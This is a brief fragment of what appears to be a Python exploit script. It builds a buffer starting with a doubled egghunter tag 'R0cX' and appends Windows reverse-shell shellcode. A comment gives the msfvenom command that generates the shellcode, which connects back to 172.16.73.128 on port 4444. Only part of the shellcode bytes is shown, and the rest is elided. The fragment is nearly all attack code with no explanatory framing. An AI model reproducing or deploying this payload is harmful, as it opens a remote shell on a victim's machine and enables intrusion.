...
buffer2 = "R0cX" + "R0cX" 
# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=172.16.73.128 LPORT=4444 -f c
buffer2 += ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
...
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xac\x10\x49\x80\x68"
